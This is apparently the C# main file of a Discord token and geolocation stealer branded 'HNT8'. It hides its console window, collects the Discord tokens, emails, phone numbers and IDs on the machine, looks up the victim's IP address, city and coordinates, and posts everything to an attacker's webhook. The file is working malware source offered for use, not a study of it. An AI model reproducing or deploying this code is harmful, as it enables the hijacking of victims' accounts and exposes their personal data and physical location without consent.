using System.Collections.Generic;
using HNT8.Leaks.Discord;
using HNT8.Leaks.Discord.Structures;
using HNT8.Leaks.GeoLocation;
using HNT8.Leaks.GeoLocation.Structures;
using System;
using Discord.Webhook;
using Discord;
using System.Reflection;

namespace HNT8
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;

            // Hides console window
            Misc.HideWindow();

            // Gets discord accounts & geo information
            List<DiscordInfo> Accounts = DiscordGrabber.GetAccounts();
            GeoInfo GeoInfo = GeoGrabber.GetGeoInfo();

            // Creates webhook
            DiscordWebhook hook = new DiscordWebhook
            {
                Url = Configuration.WebHook
            };

            // Adds avatar, embeds, and username to webhook
            DiscordMessage message = new DiscordMessage
            {
                AvatarUrl = "https://hnt8.net/logos/HNT8_transparent_favicon.png",
                Username = "HNT8 - Discord Token & Geo Info Logger",
                Embeds = new List<DiscordEmbed>(),
            };

            // Turns each discord account into an embed message and adds it to the embed list
            foreach (DiscordInfo account in Accounts)
            {
                DiscordEmbed acembed = new DiscordEmbed
                {
                    Title = account.Username + "#" + account.Discriminator,
                    Thumbnail = new EmbedMedia() { Url = account.AvatarLink, Width = 150, Height = 150 },
                    Author = new EmbedAuthor()
                    {
                        Name = "HNT8 Organization",
                        Url = "https://hnt8.net/"
                    },
                    Fields = new List<EmbedField>(),
                    Timestamp = DateTime.Now,
                    Description = $"Token: **``{account.Token}``**Username: **{account.Username}**\nID: **{account.UserID}**\nEmail: **{account.Email}**\nPhone: **{account.Phone}**\nLocale: **{account.Locale}**\nBio: ```{account.Bio}```"
                };
                message.Embeds.Add(acembed);
            }

            // Turns GeoInfo into a readable embed and gets added to embed list
            DiscordEmbed embed = new DiscordEmbed
            {
                Title = GeoInfo.IPAddress,
                Author = new EmbedAuthor()
                {
                    Name = "HNT8 Organization",
                    Url = "https://hnt8.net/"
                },
                Fields = new List<EmbedField>(),
                Thumbnail = new EmbedMedia
                {
                    Url = GeoInfo.CountryEmoji,
                    Height = 50
                },
                Description = $"IP Address: **{GeoInfo.IPAddress}**\nCity: **{GeoInfo.City}**\nRegion: **{GeoInfo.Region}**\nRegion Code: **{GeoInfo.RegionCode}**\nCountry: **{GeoInfo.Country}**\nCountry Code: **{GeoInfo.CountryCode}**\nContinent: **{GeoInfo.Continent}**\nContinent Code: **{GeoInfo.ContinentCode}**\nLatitude: **{GeoInfo.Latitude}**\nLongitude: **{GeoInfo.Longitude}**\nPostal Code: **{GeoInfo.Postal}**"
            };
            message.Embeds.Add(embed);

            // Sends embed
            hook.Send(message);
        }

        static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("HNT8.Libraries.Newtonsoft.Json.dll")){
                var assemblyData = new Byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        }
    }
}
